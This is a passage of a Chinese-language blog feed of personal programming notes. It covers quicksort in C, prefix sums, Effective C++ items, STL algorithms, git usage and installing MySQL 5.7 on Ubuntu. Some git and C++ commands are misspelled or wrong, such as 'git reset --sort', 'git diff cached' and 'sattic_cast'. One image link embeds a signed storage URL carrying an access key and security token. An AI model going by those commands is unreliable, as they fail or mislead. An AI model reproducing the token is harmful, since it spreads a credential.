sort(list2, list2_size);<br>        merge(list1, list1_size, list2, list2_size);<br>   <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>迭代代码实现</p></li></ol><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><ol><li>普通实现的快速排序</li></ol>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">findMidSub</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span>&#123;<br>    ints[<span class="hljs-number">0</span>]=ints[low];<br>    <span class="hljs-keyword">while</span>(low&lt;high)&#123;<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[high]&gt;ints[<span class="hljs-number">0</span>])&#123;<br>            high--;<br>        &#125;<br>        ints[low]=ints[high];<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[low]&lt;ints[<span class="hljs-number">0</span>])&#123;<br>            low++;<br>        &#125;<br>        ints[high]=ints[low];<br>    &#125;<br>    ints[low]=ints[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> low;<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span> &#123;<br>    <span class="hljs-keyword">if</span>(low&lt;high)&#123;<br>        <span class="hljs-type">int</span> midSub=findMidSub(ints,low,high);<br>   <br>        sort(ints,low,midSub<span class="hljs-number">-1</span>);<br>        sort(ints,midSub+<span class="hljs-number">1</span>,high);<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure><ol start="2"><li><p>改良的快排</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">findMidSub</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span>&#123;<br>    <span class="hljs-type">int</span> mid=low+(high-low)/<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span>(ints[mid]&gt;ints[high])&#123;<br>        <span class="hljs-type">int</span> tem=ints[mid];<br>        ints[mid]=ints[high];<br>        ints[high]=tem;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ints[low]&gt;ints[high])&#123;<br>        <span class="hljs-type">int</span> tem=ints[low];<br>        ints[low]=ints[high];<br>        ints[high]=tem;<br>    &#125;<br>   <br>    <span class="hljs-keyword">if</span>(ints[low]&lt;ints[mid])&#123;<br>        <span class="hljs-type">int</span> tem=ints[mid];<br>        ints[mid]=ints[low];<br>        ints[low]=tem;<br>    &#125;<br>    ints[<span class="hljs-number">0</span>]=ints[low];<br>   <br>   <br>    <span class="hljs-keyword">while</span>(low&lt;high)&#123;<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[high]&gt;ints[<span class="hljs-number">0</span>])&#123;<br>            high--;<br>        &#125;<br>        ints[low]=ints[high];<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[low]&lt;ints[<span class="hljs-number">0</span>])&#123;<br>            low++;<br>        &#125;<br>        ints[high]=ints[low];<br>    &#125;<br>    ints[low]=ints[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> low;<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span> &#123;<br>    <span class="hljs-keyword">if</span>(low&lt;high)&#123;<br>        <span class="hljs-type">int</span> midSub=findMidSub(ints,low,high);<br>   <br>        sort(ints,low,midSub<span class="hljs-number">-1</span>);<br>        sort(ints,midSub+<span class="hljs-number">1</span>,high);<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="基数排序（桶排序-x2F-箱排序）"><a href="#基数排序（桶排序-x2F-箱排序）" class="headerlink" title="基数排序（桶排序&#x2F;箱排序）"></a>基数排序（桶排序&#x2F;箱排序）</h2><ol><li>根据不同的关键词经行排序，所以桶排序适合于关键词的个数</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前缀和与差分</title>
    <link href="/2023/05/29/%E7%AE%97%E6%B3%95/learn/%E5%89%8D%E7%BC%80%E5%92%8C%E4%B8%8E%E5%B7%AE%E5%88%86/"/>
    <url>/2023/05/29/%E7%AE%97%E6%B3%95/learn/%E5%89%8D%E7%BC%80%E5%92%8C%E4%B8%8E%E5%B7%AE%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前缀和与差分"><a href="#前缀和与差分" class="headerlink" title="前缀和与差分"></a>前缀和与差分</h1><h2 id="前缀和"><a href="#前缀和" class="headerlink" title="前缀和"></a>前缀和</h2><ol><li><p>前缀和可以理解为，数列的前n项的和</p><p><code>sum[i]</code>代表了，0~i的区间和</p></li></ol><h2 id="差分"><a href="#差分" class="headerlink" title="差分"></a>差分</h2><h3 id="差分标记"><a href="#差分标记" class="headerlink" title="差分标记"></a>差分标记</h3><ol><li><p>数组<code>L-&gt;R</code>的都加上<code>+num</code>。等于差分数组的第<code>L</code>个元素<code>+num</code>，第<code>R+1</code>个元素<code>-num</code>。然后对差分数组求前缀和就是原数组；</p><p><code>[ L,R ] + v  &lt;-&gt; d[L]+num,d[R+1]-num</code></p><p>如果<code>R+1</code>越界，就不用管，则相当于没有</p></li><li><p>实际操作的时候我们不需要把差分数组做出来，我们只需要初始化为<code>0</code></p></li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>改程序和设计程序的55个具体做法</title>
    <link href="/2023/05/29/effective/effective/"/>
    <url>/2023/05/29/effective/effective/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="改程序和设计程序的55个具体做法"><a href="#改程序和设计程序的55个具体做法" class="headerlink" title="改程序和设计程序的55个具体做法"></a>改程序和设计程序的55个具体做法</h1><h3 id="条款-04"><a href="#条款-04" class="headerlink" title="条款 04"></a>条款 04</h3><p><strong>确保对象在使用中之前被初始化</strong></p><ol><li>使用初始化列表<ul><li>最好初始化列表与变量声明一一对应，也就是说与变量的声明顺序一致</li></ul></li></ol><h2 id="构造-x2F-析构-x2F-赋值"><a href="#构造-x2F-析构-x2F-赋值" class="headerlink" title="构造&#x2F;析构&#x2F;赋值"></a>构造&#x2F;析构&#x2F;赋值</h2><h3 id="条款-05"><a href="#条款-05" class="headerlink" title="条款  05"></a>条款  05</h3><p><strong>了解c++默默写了哪些函数</strong></p><ol><li>构造函数，拷贝构造函数，析构函数</li></ol><h3 id="条款-06"><a href="#条款-06" class="headerlink" title="条款  06"></a>条款  06</h3><p><strong>若不想使用编译器自动生成的函数，就该明确拒绝</strong></p><ol><li>为驳回编译器自动提供的机能，可以将相对应的函数声明为<code>private</code>并且不实现</li></ol><h3 id="条款-07"><a href="#条款-07" class="headerlink" title="条款  07"></a>条款  07</h3><p><strong>为多态基类声明<code>virtual</code>析构函数</strong></p><ol><li><code>vitrual</code>的基类一定要有一个虚析构函数</li><li>普通的类不应该使用<code>vitrual</code>（不当作base class或者不使用多态）</li></ol><h3 id="条款-08"><a href="#条款-08" class="headerlink" title="条款 08"></a>条款 08</h3><ol><li><p>不建议在析构函数里面使用捕获异常的代码</p><p><code>try</code> <code>catch</code></p></li><li><p>最好不要让析构函数吐出异常，如果吐出异常应该吞下（不提供处理）</p></li><li><p>如果需要处理此问题，应该提供一个普通函数，处理异常</p></li></ol><h3 id="条款-09"><a href="#条款-09" class="headerlink" title="条款 09"></a>条款 09</h3><p><strong>绝不在构造和析构函数里调用<code>virtual</code></strong></p><ol><li>因为父类的构造函数会比基类的更早运行，如果在构造函数里面调用，调用的是父类的函数</li><li>使用静态函数得到信息返回给父类的构造函数</li></ol><h3 id="条款-10"><a href="#条款-10" class="headerlink" title="条款 10"></a>条款 10</h3><p><strong>operator&#x3D;返回自身引用</strong></p><ol><li>令赋值操作返回的是引用的<code>* this</code></li></ol><h3 id="条款-11"><a href="#条款-11" class="headerlink" title="条款 11"></a>条款 11</h3><p><strong>operator&#x3D; 返回自身</strong></p><p><img src="https://effective-1317182407.cos.ap-nanjing.myqcloud.com/%E6%9E%84%E9%80%A0%E6%9E%90%E6%9E%84%E8%B5%8B%E5%80%BC/%E9%87%8D%E8%BD%BD%E8%BF%90%E7%AE%97%E7%AC%A6%3D.png?q-sign-algorithm=sha1&q-ak=AKID-PeNlHif0nJ_wEg1BUP9j18Q2muRHA-9XnXXi4WLDqcb3LNivTXqBS9oxdh9wcvR&q-sign-time=1681975771;1681979371&q-key-time=1681975771;1681979371&q-header-list=host&q-url-param-list=&q-signature=1d45e441df698b4111a5f9e3cb05771adc62066d&x-cos-security-token=exjIlrnN5LZXIw2T1Hf3mFeft1nV1RQa18fb9ebae4e1eebf72bece2ba52d694avVpAWkDRSq9op61Vz0dBiJ8jUfvLzNKV3i0j6w605w46bZGDrlMOpOayWo2cZS0WzslpQmC_U_6Le7WBb-drutWIY5I76ngUXLd7cfnA0M500OBF9bOx2tnjwSmHCG6TTfim2DOR_A74zl6Xx8Dh2--a8x6cilYGRVtSbBZSMzv7rRxT3SaDoWfY90mLBCU1"></p><ol><li><p>解决对于自己赋值自己的情况</p><p>在经行操作的时候判断，是否是自己，如果是的话就直接返回</p></li><li><p>如果不考虑自己赋值自己的情况</p><p>应该使用临时变量保存原来的地址，如果<code>new</code>失败了，指向的地址也不会出错</p></li></ol><h3 id="条款-12"><a href="#条款-12" class="headerlink" title="条款 12"></a>条款 12</h3><p><strong>operator&#x3D; 赋值对象时勿忘每一个成分</strong></p><ol><li>在使用复制构造函数或者移动构造函数时，我们需要调用父类的构造函数</li></ol><h2 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理"></a>资源管理</h2><h3 id="条款-13"><a href="#条款-13" class="headerlink" title="条款 13"></a>条款 13</h3><ol><li><code>auto_ptr</code>使用有bg,所以选择c++11的智能指针</li></ol><h3 id="条款-14"><a href="#条款-14" class="headerlink" title="条款 14"></a>条款 14</h3><p><strong>在资源管理中心小心<code>coping</code>行为</strong></p><h3 id="条款-15"><a href="#条款-15" class="headerlink" title="条款 15"></a>条款 15</h3><p><strong>在资源管理类中提供原始的资源的访问</strong></p><ol><li>使用智能指针操作原始资源（和普通指针一模一样）</li><li>使用智能指针的<code>get</code></li><li>每一个资源管理类都应该提供一个取得所管理之资源的能力（智能指针是资源管理类的一种）</li><li>显示转换比较方便，但是隐式转换对客户比较方便</li></ol><h3 id="条款-16"><a href="#条款-16" class="headerlink" title="条款 16"></a>条款 16</h3><p><strong>成对的使用<code>new</code>和<code>delete</code>时要采取相同的形式</strong></p><ol><li>不要用<code>typedef</code>和<code>using</code>对数组的对象取别名，因为数组释放需要<code>delete[]</code>容易忘记</li></ol><h3 id="条款-17"><a href="#条款-17" class="headerlink" title="条款 17"></a>条款 17</h3><p><strong>用独立的语句将newed的成员放入智能指针</strong></p><h2 id="设计和声明"><a href="#设计和声明" class="headerlink" title="设计和声明"></a>设计和声明</h2><h3 id="条款-18"><a href="#条款-18" class="headerlink" title="条款 18"></a>条款 18</h3><p><strong>让接口正确使用</strong></p><ol><li><p><code>explicit</code> 禁止隐性转化</p><p>可以当成某些时候不能直接赋值</p></li><li><p>促进正确使用的方法</p><p>保证接口的一致性，以及与内置类型的行为的兼容，也就是把参数名字写好</p></li><li><p>阻止误用</p><p>静止隐式转换，防止产生新的类型</p></li><li><p>使用智能指针，产生定制的删除器</p></li></ol><h3 id="条款-19"><a href="#条款-19" class="headerlink" title="条款 19"></a>条款 19</h3><p><strong>设计一个<code>class</code>就是设计一个<code>type</code></strong></p><ol><li>新的<code>type</code>的对象应该如何被创建和释放</li><li>对象的初始化和赋值应该是不一样的</li></ol><p>。。。。</p><h3 id="条款-20"><a href="#条款-20" class="headerlink" title="条款 20"></a>条款 20</h3><p><strong>建议引用传递</strong></p><ol><li>更加的高效</li><li>以上的规则不适用于内置类型以及迭代器</li></ol><h3 id="条款-21"><a href="#条款-21" class="headerlink" title="条款 21"></a>条款 21</h3><p><strong>在返回对象的时候，别妄想返回其引用</strong></p><ol><li>有些情况应该直接返回对象，而不是他的引用（计算器）</li></ol><h3 id="条款-22"><a href="#条款-22" class="headerlink" title="条款 22"></a>条款 22</h3><p><strong>将成员变量声明为<code>private</code></strong></p><ol><li>使用<code>getter</code>和<code>setter</code></li></ol><h3 id="条款-23"><a href="#条款-23" class="headerlink" title="条款 23"></a>条款 23</h3><p><strong>可以使用非友元或则非成员函数</strong></p><ol><li>面向对象的思想是，将成员变量进行封装</li><li>因为友元和成员函数，对成员变量的操作性是一致，所以也不介意用友元函数</li></ol><h3 id="条款-24"><a href="#条款-24" class="headerlink" title="条款 24"></a>条款 24</h3><p><strong>若所有的参数都需要类型转换，请为此采用非成员函数</strong></p><h3 id="条款-25"><a href="#条款-25" class="headerlink" title="条款 25"></a>条款 25</h3><p><strong>提供一个不会报错的<code>swap</code></strong></p><ol><li>调用官方的<code>swap()</code>调用对象满足移动构造，和拷贝复制</li></ol><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="条款-26"><a href="#条款-26" class="headerlink" title="条款 26"></a>条款 26</h3><p><strong>尽可能延长变量的定义</strong></p><ol><li>更加容易维护</li><li>但是可能存在性能的消耗</li></ol><h3 id="条款-27"><a href="#条款-27" class="headerlink" title="条款 27"></a>条款 27</h3><p><strong>正确使用类型转换</strong></p><ol><li><p><code>const_cast&lt;&gt;()</code></p><p>移除<code>const</code></p></li><li><p><code>dynamic_cast&lt;&gt;()</code></p><p>向下转型</p></li><li><p><code>reinterpret_cast&lt;&gt;()</code></p><p>用于指针操作</p></li><li><p><code>sattic_cast&lt;&gt;()</code></p><p>普通的转换，相当于创建了一个新的临时变量</p></li></ol><h3 id="条款-28"><a href="#条款-28" class="headerlink" title="条款 28"></a>条款 28</h3><p><strong>注意以引用的方式返回对象的成员</strong></p><ol><li><p>若一个函数直接返回一个指针请注意，如果我们的我们直接去这个返回值的地址会报错，因为对象在函数运行完时，就会被析构。</p><p>为解决这个办法，我们应该先用变量接住返回值，在对变量取地址</p></li></ol><h3 id="条款-29"><a href="#条款-29" class="headerlink" title="条款 29"></a>条款 29</h3><p><strong>努力写出异常安全的代码</strong></p><ol><li><p>异常安全：</p><p>没有资源的泄露</p><p>数据没有损坏  </p></li><li><p>采用<code>copy and swap</code>策略</p><p>现在副本上经行修改，等成功实现就采用<code>swap</code></p></li></ol><h3 id="条款-30"><a href="#条款-30" class="headerlink" title="条款 30"></a>条款 30</h3><p><strong>inline 各种用法</strong></p><ol><li>使用<code>inline</code>修饰函数表示内联获得更好的编译效果</li><li>对内部命名空间使用<code>inline</code>可以直接在外部命名空间的范围读取到内部命名空间的东西</li><li>隐式的<code>inline</code></li></ol><h3 id="条款-30-1"><a href="#条款-30-1" class="headerlink" title="条款 30"></a>条款 30</h3><p><strong>最小化的依赖</strong></p><ol><li>尽可能使用应用或者指针</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Effective</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>STL</title>
    <link href="/2023/05/28/c++/STL/"/>
    <url>/2023/05/28/c++/STL/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="STL之数据结构"><a href="#STL之数据结构" class="headerlink" title="STL之数据结构"></a>STL之数据结构</h1><h2 id="初始STL"><a href="#初始STL" class="headerlink" title="初始STL"></a>初始STL</h2><h3 id="STL六大件"><a href="#STL六大件" class="headerlink" title="STL六大件"></a>STL六大件</h3><ol><li><p>容器，算法，迭代器，仿函数，适配器（配接器），空间配置器</p><p><img src="https://cpp-1317182407.cos.ap-nanjing.myqcloud.com/STL/%E5%88%9D%E5%A7%8BSTL/stl%E5%85%AD%E5%A4%A7%E4%BB%B6.jpg"></p></li></ol><h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><ol><li><code>for_each()</code>函数，官方提供的用于遍历的函数</li></ol><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><ol><li><p>本质是<code>char*</code></p></li><li><p>构造</p><ul><li>使用无参构造</li><li>C语言的字符串</li><li>拷贝构造</li><li>string ( int n,char c) 使用n个c构造</li></ul></li><li><p>赋值方法</p><ul><li><p>使用<code>=</code></p><ul><li><code>chat*</code></li><li><code>string</code></li><li><code>char</code></li></ul></li><li><p>assign</p><ul><li><p>(chat*,int n)</p><p>将前面个赋值给<code>string</code></p></li></ul></li></ul></li></ol><h1 id="STL之算法"><a href="#STL之算法" class="headerlink" title="STL之算法"></a>STL之算法</h1><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><ol><li><code>for_each()</code></li><li><code>transform()</code> 搬运函数，接口默认为原值搬运。接口可以指导搬运法制</li></ol><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><ol><li><p><code>find()</code>  返回迭代器</p></li><li><p><code>find_if</code>  可以添加接口</p></li><li><p><code>binary_search()</code>  二分查找，容器需要有序。</p><p>注意返回值是<code>bool</code></p></li></ol><h3 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h3><ol><li><code>count()</code>  统计某个书的个数</li><li><code>count_if()</code>  满足<code>if</code>的个数</li></ol><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><ol><li><code>merge()</code></li></ol><h3 id="反转"><a href="#反转" class="headerlink" title="反转"></a>反转</h3><ol><li><code>reverse()</code></li></ol><h3 id="替代"><a href="#替代" class="headerlink" title="替代"></a>替代</h3><ol><li><code>replace()</code>  替代</li><li><code>replace_if()</code>  安条件替换</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git的使用</title>
    <link href="/2023/05/23/others/git%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/05/23/others/git%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="git-的使用"><a href="#git-的使用" class="headerlink" title="git 的使用"></a>git 的使用</h1><h2 id="git的运行方式"><a href="#git的运行方式" class="headerlink" title="git的运行方式"></a>git的运行方式</h2><ol><li><p>三个区域</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/git%E4%B8%89%E5%A4%A7%E5%8C%BA%E5%9F%9F.png"></p></li><li><p>四种状态</p><ul><li><p>未跟踪</p><p>还没有被<code>git</code>管理的文件</p></li><li><p>未修改</p><p>已经被<code>git</code>管理，但是还没有对文件进行修改</p></li><li><p>已修改</p><p>就是已经被修改的文件，但是还没又被提交到缓存区</p></li><li><p>已暂存</p><p>就是修改过后添加到暂存区的文件</p></li></ul><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/%E6%96%87%E4%BB%B6%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%8A%B6%E6%80%81.png"></p></li><li><p><code>.gitignore</code></p><p>防止某些重要的信息泄露，通常将本文件中不能上传的文件放入<code>.gitignore</code>文件，我们只需要将文件名放进<code>.gitignore</code>文件就可以。</p><p>但是需要忽视的文件如果已经添加进入了仓库，则<code>gitignore</code>就不在起作用了</p><p>同时也可以存放文件夹名称，代表这个文件和里面的内容会被忽视</p></li></ol><h2 id="常用的指令"><a href="#常用的指令" class="headerlink" title="常用的指令"></a>常用的指令</h2><ol><li><p>创建</p><ul><li><p><code>git init （目标）</code></p></li><li><p><code>git clone </code> </p><p>克隆一个远程的仓库</p></li></ul></li><li><p>查看仓库的状态</p><p><code>git status</code></p></li><li><p>提交操作</p><p>A. 先将工作区的文件提交到暂存区</p><p>  <code>git add</code></p><p>​可以使用<code>git add .</code>表示添加当前的所有的文件</p><p>B. 提交到仓库（只能提交到暂存区）</p><p>​<code>git commit</code> 这个会进入vim界面交互</p><p>​<img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/gitcommit%E7%9A%84%E4%BA%A4%E4%BA%92.png"></p><p>​<code>git commit -m &quot;提交的信息&quot;</code> </p></li><li><p>查看提交的信息</p><p><code>git log (--oneline)</code> </p><p>​得到提交的信息，使用–oneline获得简洁得提交记录</p></li><li><p>回到之前的版本</p><ul><li><code>git reset --sort</code>回到某个版本，并且保留工作区，缓存区得内容</li><li><code>git reset --hard</code> 回到某个版本，丢弃工作区，缓存区的内容</li><li><code>git reset --mixed</code> 回到某个版本，丢弃工作取的内容，丢弃缓存区的内容</li><li><code>git reflog</code> 查看操作的历史记录</li></ul></li><li><p>查看工作区，暂存区，本地仓库的差异</p><ul><li><p><code>git diff</code> 比较工作区，和暂存区的文件内容</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/gitdiff.png"></p><p>-红色部分代表在缓存区的数据</p><p>-绿色代表在工作区的数据</p></li><li><p><code>git diff HEAD</code> 对比和版本库的差距</p></li><li><p><code>git diff cached</code> 对比暂存区和版本库的差异</p></li><li><p><code>git fiff 版本号1 版本号2</code> 比较两个版本之间的差异，可以将版本2换成<code>HEAD</code></p></li><li><p><code>git diff HEAD~2 HEAD</code>比较上2个版本的区别，省略数字代表和上一个版本比较</p></li><li><p><code>git diff HEAD~2 HEAD 文件名</code> 比较指定的文件的差异</p></li><li><p><code>git diff 分支名1 分支名2</code> 比较两个分支名的区别</p></li></ul></li><li><p>删除文件</p><p><code>git ls-files</code> 缓存区的内容</p><ul><li><p>方法一</p><p>使用<code>rm</code>删除本地文件</p></li><li><p>方法二</p><p>使用<code>git rm</code> 将文件从工作区和缓存区都删除掉</p></li></ul><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/gitrm.png"></p></li></ol><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><ol><li><p><code>git clone</code></p><p>克隆仓库，如果没有配配置ssh将会报错</p></li><li><p>配置ssh</p></li><li><p>远程仓库的使用</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93.jpg"></p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/PushAndPull.jpg"></p><ul><li><p>关联远程仓库</p><ul><li><code> git remote add origin 远程仓库的地址</code> 关联远程创库</li><li><code>git branch -M main</code> 将分支的名字改为<code>main</code></li><li><code>git push -u origin main</code> 将本地的分支与远程创库的分支关联起来</li></ul></li><li><p>查看远程创库的</p><p><code>git remote -v</code></p></li></ul></li><li><p>分支</p><ul><li><p>创建分支</p><p><code>git branch +分支名</code> 创建一个新的分支</p></li><li><p>查看分支</p><p><code>git branch</code> 查看当前的分支</p></li><li><p>去到分支</p><p><code>git checkout dev1</code>去到第一个分支</p><p><code>git switch dev1</code>去到第一个分支</p></li><li><p>合并分支</p><p><code>git merge dev</code> 将分支dev合并到当前的分支</p></li><li><p>查看分支图</p><p><code>git log --graph  --oneline --decorate --all</code>查看分支图</p></li><li><p>删除分支</p><p><code>git branch -d dev1</code> 删除dev1分支</p></li></ul><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/gitrm.png"></p></li><li><p>解决分支冲突问题 </p><p><code>git commit -a -m</code>提交暂存和创库两个动作</p><p>当文件发生冲突的时候，我们需要手动的修改文件，然后将文件</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/%E5%88%86%E6%94%AF%E7%9A%84%E5%90%88%E5%B9%B6%E5%92%8C%E8%A7%A3%E5%86%B3%E5%86%B2%E7%AA%81.jpg"></p></li><li><p>使用变基</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/rebase.png"></p><p>从共同点开始之后的分支将会直接接在当前的分支后面</p></li><li><p>git分支流模型</p><ul><li><code>main</code></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux实战</title>
    <link href="/2023/05/22/linux/Linux%E5%AE%9E%E6%88%98/"/>
    <url>/2023/05/22/linux/Linux%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Linux实战"><a href="#Linux实战" class="headerlink" title="Linux实战"></a>Linux实战</h1><h2 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a>MySQL安装</h2><h3 id="ubuntu-5-7"><a href="#ubuntu-5-7" class="headerlink" title="ubuntu 5.7"></a>ubuntu 5.7</h3><ol><li><p>得到deb文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://dev.mysql.com/get/mysql-apt-config_0.8.12-1_all.deb<br></code></pre></td></tr></table></figure></li><li><p>配置源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dpkg -i mysql-apt-config_0.8.12-1_all.deb<br></code></pre></td></tr></table></figure></li><li><p>记得在<code>server</code>里面选择5.7</p></li><li><p>选择<code>OK</code></p></li><li><p>更新apt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">1 sudo apt-get update<br></code></pre></td></tr></table></figure></li><li><p>查看是否有5.7的版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">1 apt-cache policy mysql-server<br></code></pre></td></tr></table></figure></li><li><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get install -s mysql-client=5.7.*<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>校门外的树</title>
    <link href="/2023/05/11/%E7%AE%97%E6%B3%95/luogu/%E6%A0%A1%E9%97%A8%E5%A4%96%E7%9A%84%E6%A0%91/"/>
    <url>/2023/05/11/%E7%AE%97%E6%B3%95/luogu/%E6%A0%A1%E9%97%A8%E5%A4%96%E7%9A%84%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>[校门外的树]([P1047 <a href="https://www.luogu.com.cn/problem/P1047">NOIP2005 普及组] 校门外的树 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a>)</p><h1 id="NOIP2005-普及组-校门外的树"><a href="#NOIP2005-普及组-校门外的树" class="headerlink" title="[NOIP2005 普及组] 校门外的树"></a>[NOIP2005 普及组] 校门外的树</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>某校大门外长度为 $l$ 的马路上有一排树，每两棵相邻的树之间的间隔都是 $1$ 米。我们可以把马路看成一个数轴，马路的一端在数轴 $0$ 的位置，另一端在 $l$ 的位置；数轴上的每个整数点，即 $0,1,2,\dots,l$，都种有一棵树。</p><p>由于马路上有一些区域要用来建地铁。这些区域用它们在数轴上的起始点和终止点表示。已知任一区域的起始点和终止点的坐标都是整数，区域之间可能有重合的部分。现在要把这些区域中的树（包括区域端点处的两棵树）移走。你的任务是计算将这些树都移走后，马路上还有多少棵树。</p><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行有两个整数，分别表示马路的长度 $l$ 和区域的数目 $m$。</p><p>接下来 $m$ 行，每行两个整数 $u, v$，表示一个区域的起始点和终止点的坐标。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行一个整数，表示将这些树都移走后，马路上剩余的树木数量。</p><h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 